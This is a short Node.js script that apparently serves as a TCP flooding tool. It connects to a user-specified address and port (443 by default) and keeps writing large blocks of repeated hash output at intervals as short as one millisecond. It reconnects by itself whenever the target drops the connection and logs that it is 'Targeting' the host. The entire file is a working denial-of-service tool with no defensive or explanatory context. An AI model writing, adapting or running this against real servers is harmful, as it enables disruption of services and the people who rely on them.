const net = require('net');
const crypto = require("crypto")
var argv = require('minimist')(process.argv.slice(2), {"--": true});

if(!argv || !argv["a"]) {
  process.stdout.write(`
ERROR. Not enough arguments
---------------------------
-a <addr> | Specify where to connect (address/IP). REQUIRED!
-p <port> | Port. OPTIONAL
-i <ms>   | Request interval. OPTIONAL
`)
}

function spam() {
  console.log('Connected');
  let i = 1
  // globalThis.thread = 1
  setInterval(() => {
    process.stdout.write(`#${i} Request\n`)
    i++
    let datetime = Date.now().toString(11).repeat(16900)
    client.write(crypto.createHash("sha512")
        .update(crypto.createHash("sha512")
            .update(Date.now().toString())
            .digest("hex")
            .replace(/e/gi, Date.now().toString().repeat(57))
            .toString())
        .digest("hex")
        .toString()
        .repeat(445))
  }, argv["i"] | 1)
}

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
const TARGET = {
  ADDR: argv["a"],
  PORT: parseInt(argv["p"]) | 443
} 

var client = new net.Socket();
client.connect(TARGET.PORT, TARGET.ADDR, spam);

client.once('ready', () => {
  console.log("Client Ready!")
  console.log("Targeting " + TARGET.ADDR + ":" + TARGET.PORT)
  sleep(5E3)
})

client.on("close", function(data) {
  client.connect(TARGET.PORT, TARGET.ADDR, spam)
})

client.on("data", function(d) {
  console.log("Something happends! " + d)
})

client.setMaxListeners(50)

module.exports = {
  client,
  TARGET
}